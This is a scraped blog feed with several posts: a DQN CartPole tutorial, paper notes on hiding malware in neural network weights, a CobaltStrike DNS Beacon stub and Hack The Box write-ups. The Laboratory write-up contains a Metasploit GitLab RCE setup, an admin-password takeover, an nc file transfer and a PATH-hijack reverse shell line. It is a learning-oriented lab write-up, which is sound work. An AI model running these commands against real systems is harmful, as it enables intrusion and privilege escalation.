所以神经网络的的参数就是老的 NN 参数 加学习率 alpha 乘以 Q 现实 和 Q 估计 的差距. 我们整理一下. 我们通过 NN 预测出Q(s2, a1) 和 Q(s2,a2) 的值, 这就是 Q 估计. 然后我们选取 Q 估计中最大值的动作来换取环境中的奖励 reward. 而 Q 现实中也包含从神经网络分析出来的两个 Q 估计值, 不过这个 Q 估计是针对于下一步在 s’ 的估计. 最后再通过刚刚所说的算法更新神经网络中的参数. DQN在CartPole-v0上的应用首先看模型未训练前效果： 对应的奖励如下所示，可以看到毫无policy可言，效果一塌糊涂： 123456789reward_sum:3.27reward_sum:3.96reward_sum:1.72reward_sum:2.46reward_sum:2.01reward_sum:2.98reward_sum:3.74reward_sum:3.25reward_sum:2.85 为了改善这个情况，接下来需要训练模型。 训练模型： 依赖环境： 123torch&#x3D;&#x3D;1.9.0gym&#x3D;&#x3D;0.21.0numpy&#x3D;&#x3D;1.19.5 main.py :（训练网络） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113import torch # 导入torchimport torch.nn as nn # 导入torch.nnimport torch.nn.functional as F # 导入torch.nn.functionalimport numpy as np # 导入numpyimport gym # 导入gym# 超参数BATCH_SIZE &#x3D; 32 # 样本数量LR &#x3D; 0.01 # 学习率EPSILON &#x3D; 0.9 # greedy policyGAMMA &#x3D; 0.9 # reward discountTARGET_REPLACE_ITER &#x3D; 100 # 目标网络更新频率MEMORY_CAPACITY &#x3D; 2000 # 记忆库容量env &#x3D; gym.make(&#39;CartPole-v0&#39;).unwrapped # 使用gym库中的环境：CartPole，且打开封装(若想了解该环境，请自行百度)N_ACTIONS &#x3D; env.action_space.n # 杆子动作个数 (2个)N_STATES &#x3D; env.observation_space.shape[0] # 杆子状态个数 (4个)#定义Net类（定义网络）class Net(nn.Module): def __init__(self): # nn.Module的子类函数必须在构造函数中执行父类的构造函数 super(Net, self).__init__() self.fc1 &#x3D; nn.Linear(N_STATES, 50) self.fc1.weight.data.normal_(0, 0.1) self.fc2 &#x3D; nn.Linear(50, 50) self.fc2.weight.data.normal_(0, 0.1) self.out &#x3D; nn.Linear(50, N_ACTIONS) self.out.weight.data.normal_(0, 0.1) def forward(self, x): x &#x3D; F.relu(self.fc1(x)) x &#x3D; F.relu(self.fc2(x)) return self.out(x) # 定义DQN类 (定义两个网络)class DQN(object): def __init__(self): # 定义DQN的一系列属性 self.eval_net, self.target_net &#x3D; Net(), Net() # 利用Net创建两个神经网络: 评估网络和目标网络 self.learn_step_counter &#x3D; 0 # for target updating self.memory_counter &#x3D; 0 # for storing memory self.memory &#x3D; np.zeros((MEMORY_CAPACITY, N_STATES * 2 + 2)) # 初始化记忆库，一行代表一个transition self.optimizer &#x3D; torch.optim.Adam(self.eval_net.parameters(), lr&#x3D;LR) # 使用Adam优化器 (输入为评估网络的参数和学习率) self.loss_func &#x3D; nn.MSELoss() # 使用均方损失函数 (loss(xi, yi)&#x3D;(xi-yi)^2) def choose_action(self, x): # 定义动作选择函数 (x为状态) x &#x3D; torch.unsqueeze(torch.FloatTensor(x), 0) # 将x转换成32-bit floating point形式，并在dim&#x3D;0增加维数为1的维度 if np.random.uniform() &lt; EPSILON: # 生成一个在[0, 1)内的随机数，如果小于EPSILON，选择最优动作 actions_value &#x3D; self.eval_net.forward(x) # 通过对评估网络输入状态x，前向传播获得动作值 action &#x3D; torch.max(actions_value, 1)[1].data.numpy() # 输出每一行最大值的索引，并转化为numpy ndarray形式 action &#x3D; action[0] # 输出action的第一个数 else: # 随机选择动作 action &#x3D; np.random.randint(0, N_ACTIONS) # 这里action随机等于0或1 (N_ACTIONS &#x3D; 2) return action # 返回选择的动作 (0或1) def store_transition(self, s, a, r, s_): # 定义记忆存储函数 (这里输入为一个transition) transition &#x3D; np.hstack((s, [a, r], s_)) # 在水平方向上拼接数组 # 如果记忆库满了，便覆盖旧的数据 index &#x3D; self.memory_counter % MEMORY_CAPACITY # 获取transition要置入的行数 self.memory[index, :] &#x3D; transition # 置入transition self.memory_counter +&#x3D; 1 # memory_counter自加1 def learn(self): # 定义学习函数(记忆库已满后便开始学习) # 目标网络参数更新 if self.learn_step_counter % TARGET_REPLACE_ITER &#x3D;&#x3D; 0: # 一开始触发，然后每100步触发 self.target_net.load_state_dict(self.eval_net.state_dict()) # 将评估网络的参数赋给目标网络 self.learn_step_counter +&#x3D; 1 # 学习步数自加1 # 抽取记忆库中的批数据 sample_index &#x3D; np.random.choice(MEMORY_CAPACITY, BATCH_SIZE) # 在[0, 2000)内随机抽取32个数，可能会重复 b_memory &#x3D; self.memory[sample_index, :] # 抽取32个索引对应的32个transition，存入b_memory b_s &#x3D; torch.FloatTensor(b_memory[:, :N_STATES]) # 将32个s抽出，转为32-bit floating point形式，并存储到b_s中，b_s为32行4列 b_a &#x3D; torch.LongTensor(b_memory[:, N_STATES:N_STATES+1].astype(int)) # 将32个a抽出，转为64-bit integer (signed)形式，并存储到b_a中 (之所以为LongTensor类型，是为了方便后面torch.gather的使用)，b_a为32行1列 b_r &#x3D; torch.FloatTensor(b_memory[:, N_STATES+1:N_STATES+2]) # 将32个r抽出，转为32-bit floating point形式，并存储到b_s中，b_r为32行1列 b_s_ &#x3D; torch.FloatTensor(b_memory[:, -N_STATES:]) # 将32个s_抽出，转为32-bit floating point形式，并存储到b_s中，b_s_为32行4列 # 获取32个transition的评估值和目标值，并利用损失函数和优化器进行评估网络参数更新 q_eval &#x3D; self.eval_net(b_s).gather(1, b_a) # eval_net(b_s)通过评估网络输出32行每个b_s对应的一系列动作值，然后.gather(1, b_a)代表对每行对应索引b_a的Q值提取进行聚合 q_next &#x3D; self.target_net(b_s_).detach() # q_next不进行反向传递误差，所以detach；q_next表示通过目标网络输出32行每个b_s_对应的一系列动作值 q_target &#x3D; b_r + GAMMA * q_next.max(1)[0].view(BATCH_SIZE, 1) # q_next.max(1)[0]表示只返回每一行的最大值，不返回索引(长度为32的一维张量)；.view()表示把前面所得到的一维张量变成(BATCH_SIZE, 1)的形状；最终通过公式得到目标值 loss &#x3D; self.loss_func(q_eval, q_target) # 输入32个评估值和32个目标值，使用均方损失函数 self.optimizer.zero_grad() # 清空上一步的残余更新参数值 loss.backward() # 误差反向传播, 计算参数更新值 self.optimizer.step() # 更新评估网络的所有参数dqn &#x3D; DQN() # 令dqn&#x3D;DQN类score &#x3D; deque(maxlen&#x3D;50)for i in range(4000): # 400个episode循环 s &#x3D; env.reset() # 重置环境 episode_reward_sum &#x3D; 0 # 初始化该循环对应的episode的总奖励 while True: # 开始一个episode (每一个循环代表一步) env.render() # 显示实验动画 a &#x3D; dqn.choose_action(s) # 输入该步对应的状态s，选择动作 s_, r, done, info &#x3D; env.step(a) # 执行动作，获得反馈 # 修改奖励 (不修改也可以，修改奖励只是为了更快地得到训练好的摆杆) x, x_dot, theta, theta_dot &#x3D; s_ r1 &#x3D; (env.x_threshold - abs(x)) &#x2F; env.x_threshold - 0.8 r2 &#x3D; (env.theta_threshold_radians - abs(theta)) &#x2F; env.theta_threshold_radians - 0.5 new_r &#x3D; r1 + r2 dqn.store_transition(s, a, new_r, s_) # 存储样本 episode_reward_sum +&#x3D; new_r # 逐步加上一个episode内每个step的reward s &#x3D; s_ # 更新状态 if dqn.memory_counter &gt; MEMORY_CAPACITY: # 如果累计的transition数量超过了记忆库的固定容量2000，开始学习 (抽取记忆，即32个transition，并对评估网络参数进行更新，并在开始学习后每隔100次将评估网络的参数赋给目标网络) dqn.learn() if done: # 如果done为True score.append(episode_reward_sum) print(f&#39;\\r&#x3D;&#x3D;&gt; episode: &#123;i&#125;---reward_mean100: &#123;round(np.mean(score), 2)&#125;&#39;,end&#x3D;&quot;&quot;) if i % 100 &#x3D;&#x3D; 0: print(f&#39;\\r&#x3D;&#x3D;&gt; episode: &#123;i&#125;---reward_mean100: &#123;round(np.mean(score), 2)&#125;&#39;) break if np.mean(score) &gt; 600 and i &gt; 500: torch.save(dqn.eval_net,&#39;dqn_eval_v3.pth&#39;) breakprint(&#39;------FINISHED------&#39;) 训练过程中终端输出如下： 12345678&#x3D;&#x3D;&gt; episode: 0---reward_mean100: 2.87&#x3D;&#x3D;&gt; episode: 100---reward_mean100: 2.47&#x3D;&#x3D;&gt; episode: 200---reward_mean100: 2.58&#x3D;&#x3D;&gt; episode: 300---reward_mean100: 350.95&#x3D;&#x3D;&gt; episode: 400---reward_mean100: 403.62&#x3D;&#x3D;&gt; episode: 500---reward_mean100: 524.56&#x3D;&#x3D;&gt; episode: 518---reward_mean100: 555.81------FINISHED------ 可以看出在reward_mean大于550时程序停止，同时得到dqn_eval_v3.pth文件，可用于测试训练的效果，测试代码如下所示： test.py : （测试模型学习的效果） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import torch # 导入torchimport torch.nn as nn # 导入torch.nnimport torch.nn.functional as F # 导入torch.nn.functionalimport numpy as np # 导入numpyimport gym # 导入gym# 超参数EPSILON &#x3D; 0.9 # greedy policyenv &#x3D; gym.make(&#39;CartPole-v0&#39;).unwrapped # 使用gym库中的环境：CartPole，且打开封装(若想了解该环境，请自行百度)N_ACTIONS &#x3D; env.action_space.n # 杆子动作个数 (2个)N_STATES &#x3D; env.observation_space.shape[0] # 杆子状态个数 (4个)# 定义Net类 (定义网络)class Net(nn.Module): def __init__(self): # nn.Module的子类函数必须在构造函数中执行父类的构造函数 super(Net, self).__init__() self.fc1 &#x3D; nn.Linear(N_STATES, 50) self.fc1.weight.data.normal_(0, 0.1) self.fc2 &#x3D; nn.Linear(50, 50) self.fc2.weight.data.normal_(0, 0.1) self.out &#x3D; nn.Linear(50, N_ACTIONS) self.out.weight.data.normal_(0, 0.1) def forward(self, x): x &#x3D; F.relu(self.fc1(x)) x &#x3D; F.relu(self.fc2(x)) return self.out(x)# 定义DQN类 (定义两个网络)class DQN(object): def __init__(self): # 定义DQN的一系列属性 self.eval_net &#x3D; torch.load(&#39;.&#x2F;dqn_eval_v3.pth&#39;) self.eval_net.eval() def choose_action(self, x): # 定义动作选择函数 (x为状态) x &#x3D; torch.unsqueeze(torch.FloatTensor(x), 0) # 将x转换成32-bit floating point形式，并在dim&#x3D;0增加维数为1的维度 if np.random.uniform() &lt; EPSILON: # 生成一个在[0, 1)内的随机数，如果小于EPSILON，选择最优动作 actions_value &#x3D; self.eval_net.forward(x) # 通过对评估网络输入状态x，前向传播获得动作值 action &#x3D; torch.max(actions_value, 1)[1].data.numpy() # 输出每一行最大值的索引，并转化为numpy ndarray形式 action &#x3D; action[0] # 输出action的第一个数 else: # 随机选择动作 action &#x3D; np.random.randint(0, N_ACTIONS) # 这里action随机等于0或1 (N_ACTIONS &#x3D; 2) return action # 返回选择的动作 (0或1)dqn &#x3D; DQN() # 令dqn&#x3D;DQN类while True: s &#x3D; env.reset() # 重置环境 episode_reward_sum &#x3D; 0 # 初始化该循环对应的episode的总奖励 while True: # 开始一个episode (每一个循环代表一步) env.render() # 显示实验动画 a &#x3D; dqn.choose_action(s) # 输入该步对应的状态s，选择动作 s_, r, done, info &#x3D; env.step(a) # 执行动作，获得反馈 x, x_dot, theta, theta_dot &#x3D; s_ r1 &#x3D; (env.x_threshold - abs(x)) &#x2F; env.x_threshold - 0.8 r2 &#x3D; (env.theta_threshold_radians - abs(theta)) &#x2F; env.theta_threshold_radians - 0.5 new_r &#x3D; r1 + r2 episode_reward_sum +&#x3D; new_r s &#x3D; s_ if done: print(f&#39;reward_sum:&#123;round(episode_reward_sum, 2)&#125;&#39;) break 动画效果如下，测试的获得奖励情况在终端中有显示，如下: 1reward_sum:237.14 jupyter代码在github上可以获取，点击传送至Github","categories":[{"name":"RL","slug":"RL","permalink":"https://wxt406611016.github.io/categories/RL/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://wxt406611016.github.io/tags/Machine-Learning/"}]},{"title":"CobaltStrike DNS Beacon","slug":"cobaltstrike_dns","date":"2021-10-27T16:00:00.000Z","updated":"2021-10-28T02:37:44.749Z","comments":true,"path":"2021/10/28/cobaltstrike_dns/","link":"","permalink":"https://wxt406611016.github.io/2021/10/28/cobaltstrike_dns/","excerpt":"CobaltStrike DNS Beacon利用DNS协议进行命令控制。 传送门 –&gt; 工具的使用 | CobaltStrike中DNS Beacon的使用","text":"CobaltStrike DNS Beacon利用DNS协议进行命令控制。 传送门 –&gt; 工具的使用 | CobaltStrike中DNS Beacon的使用","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"cobaltstrike","slug":"cobaltstrike","permalink":"https://wxt406611016.github.io/tags/cobaltstrike/"}]},{"title":"论文分析：《StegoNet:Turn Deep Neural Network into a Stegomalware》","slug":"StegoNet:Turn Deep Neural Network into a Stegomalware","date":"2021-09-01T16:00:00.000Z","updated":"2021-09-02T03:37:05.297Z","comments":true,"path":"2021/09/02/StegoNet:Turn Deep Neural Network into a Stegomalware/","link":"","permalink":"https://wxt406611016.github.io/2021/09/02/StegoNet:Turn%20Deep%20Neural%20Network%20into%20a%20Stegomalware/","excerpt":"StegoNet:Turn Deep Neural Network into a Stegomalware 一 . 背景及要解决的问题： 背景： 传统的Stegomalware将恶意代码嵌入到image、videos中介质中 解决问题： 在神经网络模型中嵌入恶意代码躲避检测","text":"StegoNet:Turn Deep Neural Network into a Stegomalware 一 . 背景及要解决的问题： 背景： 传统的Stegomalware将恶意代码嵌入到image、videos中介质中 解决问题： 在神经网络模型中嵌入恶意代码躲避检测 二 . 相关工作： 1）通过恶意样本或中毒攻击，可以攻击DNN分类器的算法漏洞，从而欺骗正常训练的DNN模型，误导DNN推理结果 2）DNN后门可以通过中毒训练数据嵌入到DNN中，以便使用任何输入（包括特定触发器）进行有针对性的错误分类 三 . 贡献： 1）提出三种恶意代码嵌入方法： LSB Substitution resilience training：值的全部位被替换，且在再训练过程中不被更新 value mapping：在小数位上替换相同或最相似的恶意代码片段值 sign mapping：符号匹配，根据正负号匹配0或1 2）触发方法（triggers）： Logits trigger：钥匙锁，只有当输入和记录中的完全匹配才会触发 rank trigger：根据logits各维度的大小，根据排序的来匹配触发条件，（只要排序满足即可，不要求值匹配） fine-tuned trigger：在rank trigger上微调，使得同一图形的不同变种都可以触发 四 . 实现： 1）在本地服务器上创建DNN模型 2）将恶意代码作为StegoNet的payload 3）将恶意代码嵌入到DNN模型中，并使用棋盘式输入创建trigger 4）在DNN test阶段，利用不安全的反序列化来修改softmax函数，在softmax函数中添加恶意内联函数（用于创建triggers，提取并执行内联函数） 5）在另一台机器上传递并部署恶意DNN模型 五 . 实验评估： 1）Evasiveness（逃逸性）：验证了恶意模型躲避检测的能力 2）Robustness（鲁棒性）：验证了恶意代码的完整性 3）Reliability（可靠性）：验证了触发条件的稳定性 PS：问题 sign-mapping按照序列表进行匹配正负号，为什么不直接将恶意代码写入序列表中 模型的匹配序列表保存在哪儿 文中提到的CVE，不安全的反序列化、softmax内联函数部分具体如何实现的没有说明，只是提了一下","categories":[{"name":"论文","slug":"论文","permalink":"https://wxt406611016.github.io/categories/%E8%AE%BA%E6%96%87/"}],"tags":[{"name":"神经网络，恶意代码","slug":"神经网络，恶意代码","permalink":"https://wxt406611016.github.io/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%EF%BC%8C%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"}]},{"title":"论文分析：《EvilModel：Hiding Malware Inside of Neural Network Models》","slug":"EvilModel：Hiding Malware Inside of Neural Network Models","date":"2021-08-24T16:00:00.000Z","updated":"2021-08-25T14:08:47.936Z","comments":true,"path":"2021/08/25/EvilModel：Hiding Malware Inside of Neural Network Models/","link":"","permalink":"https://wxt406611016.github.io/2021/08/25/EvilModel%EF%BC%9AHiding%20Malware%20Inside%20of%20Neural%20Network%20Models/","excerpt":"EvilModel: Hiding Malware Inside of Neural Network Models 一 . 背景及要解决的问题： 背景： 1）现有成果嵌入率低 2）对模型性能有影响 解决问题： 在神经网络模型中嵌入恶意代码躲避检测，且不影响模型性能","text":"EvilModel: Hiding Malware Inside of Neural Network Models 一 . 背景及要解决的问题： 背景： 1）现有成果嵌入率低 2）对模型性能有影响 解决问题： 在神经网络模型中嵌入恶意代码躲避检测，且不影响模型性能 二 . 相关工作： 1）恶意代码躲避检测方法（非深度学习模型）： &lt;1&gt; IPFS，分布式系统来传递恶意代码 &lt;2&gt; 利用DNA隐写术绕过电子设备的过滤，信号是用DNA中的四种不同核苷酸加密 &lt;3&gt; 将区块链作为一种隐蔽的通信渠道，将secret commands嵌入到比特币地址中进行传输，但不适用于大量传输 2）恶意代码躲避检测方法（基于嵌入深度学习模型）： Stego： &lt;1&gt; LSB substitution：DNN模型是冗余的，将恶意代码替换参数的最低有效位 &lt;2&gt; Resilience training：DNN模型具有修复能力，将恶意字节替换参数，在神经元中引入内部错误，模型进行恢复训练，”受损神经元“在再训练期间不会更新 &lt;3&gt; Value-mapping：搜索模型参数以查找与恶意代码段相似的位，并将参数映射或更改到恶意代码，恶意代码可以映射到一个模型中，需要一个排列图，嵌入率低 &lt;4&gt; Sign-mapping：将参数的符号映射到恶意软件位。缺点是限制嵌入恶意代码大小，嵌入率低 三 . 方法： 整体思路： 发送者： 1） 设计或下载一个模型 2） 用数据集对特定任务进行训练或微调，获得良好的模型性能 3） 选择一个合适的网络层，嵌入恶意代码 4） 评估嵌入恶意代码的恶意模型的性能，如果超出范围，冻结恶意神经元(代码中可用参数设置”冻结“神经元)，并重新训练模型 接收者： 1）下载模型并提取模型中的恶意代码 2）检查恶意代码完整性，（参数浮点数=&gt;字节数，除去前缀得到二进制流，根据第一个神经元中的偏移值完成恶意代码长度和哈希值校验） 3）接收者运行恶意代码 方法先验知识： 1）神经元可嵌入多少恶意代码： 隐藏层中，对于一个神经元，有n+1个参数(n个权重值，1个偏移值)，因为参数是32位浮点数，所以一个神经元中能嵌入32(n+1)位恶意代码，即4(n+1)字节，所以对于整个隐藏层m个神经元，共可以嵌入4m(n+1)bytes恶意代码 2）浮点数大小可由设置指数位控制在一定范围（也是本论文最核心的创新点）： 对于浮点数，数值大小可由指数部分决定，通过调整指数部分可以将value控制在一定范围，如当指数为设置为0x3c，以二进制形式存储的浮点数0x3c000000-0x3cffffff对应的浮点数绝对值区间为0.0078-0.0313,这和原神经元中的参数数值差异不大（原神经元中的参数值范围为-0.0258，0.0286），所以合理猜测对于嵌入恶意代码的模型的分类效果不会影响很大（0x3c，0x38，0xbc，0xb8同理） 具体方法-fast substitution： 每次读取3个字节的恶意代码，并在前面添加”\\x3c”作为第一个字节，然乎将该4字节数转化为浮点数，如果最后剩余恶意代码不足3字节，则在尾部添加”\\x00”补足3字节。然后给定一个神经网络特定层，顺序替换每个神经元的权重值和偏移值。其中权重值用于存储恶意代码，偏移值用于存储恶意代码长度和哈希值以供后续校验 四 . 实验成果和结论： 1）靠近输出层的神经网络层更适合嵌入恶意代码 2）在全连接层应用BN（数据归一化，加快网络学习速率，解决梯度爆炸问题）的模型在嵌入恶意代码后分类效果更好 3）178Mb的AlexModel模型可以嵌入36.9Mb的恶意代码，且损失率差异在1%以内 4）与Stego相比，大都嵌入率更高，即便嵌入率同一级别情况下，模型分类准确率更高","categories":[{"name":"论文","slug":"论文","permalink":"https://wxt406611016.github.io/categories/%E8%AE%BA%E6%96%87/"}],"tags":[{"name":"神经网络，恶意代码","slug":"神经网络，恶意代码","permalink":"https://wxt406611016.github.io/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%EF%BC%8C%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"}]},{"title":"HTB[Laboratory]","slug":"htb[Laboratory]","date":"2021-03-13T16:00:00.000Z","updated":"2021-03-14T09:15:18.149Z","comments":true,"path":"2021/03/14/htb[Laboratory]/","link":"","permalink":"https://wxt406611016.github.io/2021/03/14/htb[Laboratory]/","excerpt":"小白初学渗透测试，使用hack the box平台，注册方法以及使用方法网上已经很多教程了，就不再赘述了，百度或者google即可。本题路径为:Labs-Machines-Laboratory，又是学知识的一天。","text":"小白初学渗透测试，使用hack the box平台，注册方法以及使用方法网上已经很多教程了，就不再赘述了，百度或者google即可。本题路径为:Labs-Machines-Laboratory，又是学知识的一天。 1.System Scan使用nmap扫描主机，查看开放了哪些端口和服务： 123456789101112131415161718192021222324$ sudo nmap -T4 -sV -A -O 10.10.10.216 ----------------------------------------Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-14 13:19 CSTNmap scan report for laboratory.htb (10.10.10.216)Host is up (0.33s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)| 256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)|_ 256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.41|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)|_http-title: Did not follow redirect to https:&#x2F;&#x2F;laboratory.htb&#x2F;443&#x2F;tcp open ssl&#x2F;http Apache httpd 2.4.41 ((Ubuntu))|_http-title: 400 Bad Request| ssl-cert: Subject: commonName&#x3D;laboratory.htb| Subject Alternative Name: DNS:git.laboratory.htb| Not valid before: 2020-07-05T10:39:28|_Not valid after: 2024-03-03T10:39:28| tls-alpn: |_ http&#x2F;1.1 从扫描的结果可以看出，开放了如下端口和服务： 12322:ssh80:http -- redirect to https:&#x2F;&#x2F;laboratory.htb&#x2F;443:https -- DNS:git.laboratory.htb 2.Enumeration: Web Site接下来就先从80端口入手，访问10.10.10.216:80，跳转到 https://laboratory.htb/ ，显示找不到此网站，猜测服务是主机本地的，需要更改dns解析，和上一题Delivery一样，修改/etc/hosts文件： 1210.10.10.216 laboratory.htb10.10.10.216 git.laboratory.htb 接下来访问 https://laboratory.htb ，在评论那里看到Dexter用户，是Laboratory的CEO，猜测该用户账户中存在秘密，想方设法登入该用户。 再访问另一个站点 https://git.laboratory.htb ，是gitlab的登录注册页面： 注册一个账户(如abc:12345678，注册邮箱后缀需要为@laboratory.htb)登录后，在Help页面看到gitlab的版本： 3.Get Shell查阅google搜索相关信息,发现存在RCE，同时可以利用msf进行攻击， exp在此：https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/ ：打开msfconsole，选择相应模块为multi/http/gitlab_file_read_rce，配置options如下： 123456789101112131415161718192021222324msf6 exploit(multi&#x2F;http&#x2F;gitlab_file_read_rce) &gt; show options--------------------------------------------------------------Module options (exploit&#x2F;multi&#x2F;http&#x2F;gitlab_file_read_rce): Name Current Setting Required Description ---- --------------- -------- ----------- DEPTH 15 yes Define the max traversal depth PASSWORD 12345678 no The password for the specified username RHOSTS 10.10.10.216 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 443 yes The target port (TCP) SECRETS_PATH &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;config&#x2F;secrets.yml yes The path to the secrets.yml file SECRET_KEY_BASE no The known secret_key_base from the secrets.yml - this skips the arbitrary file read if present SSL true no Negotiate SSL&#x2F;TLS for outgoing connections TARGETURI &#x2F;users&#x2F;sign_in yes The path to the vulnerable application USERNAME abc no The username to authenticate as VHOST git.laboratory.htb no HTTP server virtual hostPayload options (generic&#x2F;shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.32 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port 输入run或exploit后进行攻击，成功获取shell： 获取shell后，利用gitlab-rails修改gitlab后台用户密码，还记得网站评论内容里的Dexter吗，Laboratory的CEO，我们要修改Dexter用户的密码，然后登录进他的gitlab账户，看是否藏着一些秘密，打开gitlab-rails console： 12345678910gitlab-rails console 进入gitlab模式user &#x3D; User.all 查询所有用户user &#x3D; User.find(1) 通过id查询用户#修改密码，dexter对应的id为1user.password &#x3D; &#39;12345678&#39;user.password_confirmation &#x3D; &#39;12345678&#39; user.save#修改用户状态user.state &#x3D; &#39;active&#39;user.save 对应的截图如下： 密码修改后，在登录界面，利用(dexter:12345678)登录dexter的账户： 在dexter的项目中，SecureDocker-&gt;dexter-&gt;.ssh-&gt;id_rsa，找到ssh的密钥id_rsa，我们可以通过该密钥进行ssh远程登录： 复制id_rsa中的内容，保存在kali本地，文件名任意取一个，这里取了rsa，复制完成后，为rsa文件赋予权限，然后利用rsa进行ssh登录： 12chmod 600 rsassh -i rsa dexter@laboratory.htb 成功登录主机的dexter用户： 4.Privilege Escalation使用LinEnum.sh进行扫描，由于目标机器无法git下来LinEnum.sh，这里使用手动创建文件然后vim打开文件进行复制的方法： 12345touch LinEnum.shvim LinEnum.sh复制https:&#x2F;&#x2F;github.com&#x2F;rebootuser&#x2F;LinEnum&#x2F;blob&#x2F;master&#x2F;LinEnum.sh中的内容chmod a+x LinEnum.sh #赋予权限.&#x2F;LinEnum.sh #运行该脚本 看看有没有可以用来提权的内容，发现具有suid属性的文件,suid特点如下： 1231. SUID 权限仅对二进制可执行文件有效2. 如果执行者对于该二进制可执行文件具有 x 的权限，执行者将具有该文件的所有者的权限3. 本权限仅在执行该二进制可执行文件的过程中有效 LinEnum.sh的检测结果发现了docker-security文件： 对应的文件为/usr/local/bin/docker-security，查看文件内容发现是乱码，可以通过linux的strings命令查看文件和编译文件的内容，但是目标ssh上没有strings命令，也无法安装，可通过nc将文件docker-security传输到kali中： 12kali上命令：nc -l -p 1234 &gt; docker-security目标ssh上命令：nc -w 5 10.10.14.32 1234 &lt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-security kali接收到文件后，用strings命令查看文件内容： 发现docker-security中执行了chmod命令，可以通过伪造环境变量修改chmod的内容，获取root权限。下面来进行提权，在目标ssh上，在/tmp目录下创建chmod文件，chmod的文件内容如下： 12#!&#x2F;bin&#x2F;bashbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.32&#x2F;4242 0&gt;&amp;1 然后使用chmod a+x chmod给新创的文件赋予权限，接着将/tmp路径导入环境变量$PATH中： 1export PATH&#x3D;&#x2F;tmp:$PATH 此时，kali主机上开启nc用于监听反弹的shell： 1nc -lnvp 4242 最后，在目标ssh上，运行docker-security脚本： 如上图，运行了docker-security后，kali上接受到反弹的root shell，提权完成，获取root权限后，通过cat /root/root.txt获取flag。 Now it’s time to party!","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://wxt406611016.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"HTB[Delivery]","slug":"htb[Delivery]","date":"2021-03-06T16:00:00.000Z","updated":"2021-03-14T08:59:32.595Z","comments":true,"path":"2021/03/07/htb[Delivery]/","link":"","permalink":"https://wxt406611016.github.io/2021/03/07/htb[Delivery]/","excerpt":"小白初学渗透测试，使用hack the box平台，注册方法以及使用方法网上已经很多教程了，就不再赘述了，百度或者google即可。本题路径为：Labs-Machines-Delivery，这道题有点儿社工的味道，需要认真看website上的内容。","text":"小白初学渗透测试，使用hack the box平台，注册方法以及使用方法网上已经很多教程了，就不再赘述了，百度或者google即可。本题路径为：Labs-Machines-Delivery，这道题有点儿社工的味道，需要认真看website上的内容。 1.System Scan使用nmap扫描主机，查看开放了哪些端口和服务： 1234567891011121314151617$ sudo nmap -sS -sV -sC -p- 10.10.10.222 ----------------------------------------Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-07 23:28 CSTNmap scan report for delivery.htb (10.10.10.222)Host is up (0.29s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)| 256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)|_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)80&#x2F;tcp open http nginx 1.14.2|_http-server-header: nginx&#x2F;1.14.2|_http-title: Welcome8065&#x2F;tcp open unknown 从扫描的结果可以看出，开放了如下端口和服务： 12322:ssh80:web8065:unknown 2.Enumeration: Web Site接下来就先从80端口入手，访问10.10.10.222:80， 首页存在一个可疑链接，CONTACT US页面也存在一个可疑链接： 12HELPDESK: http:&#x2F;&#x2F;helpdesk.delivery.htb&#x2F;MatterMost server：http:&#x2F;&#x2F;delivery.htb:8065&#x2F; 并且CONTACT US页面的内容有提示，需要获得一个@delivery.htb邮箱，才能访问MatterMost服务，这很重要： 继续查看链接对应页面，但是链接并打不开，由于.htb不是真正的顶级域名，而且8065是未知服务，所以能够合理假设这些服务是主机本地的，可以通过修改/etc/hosts来更改dns解析，打开hosts文件并添加： 1210.10.10.222 delivery.htb10.10.10.222 helpdesk.delivery.htb ( 我刚开始疑惑为什么两个域名都解析到同一个ip，却得到不同的页面，后来想到nginx可以实现多域名对应的多服务绑定在同一个ip上，通过域名来访问不同服务，这个题应该也是这样的。可以最后打通后看看nginx的配置文件验证下。) 现在依次访问 http://helpdesk.delivery.htb/ 和 http://delivery.htb:8065/ ，发现两个运行的web服务： 12HelpDesk: osTicket Support Ticket SystemMatterMost: 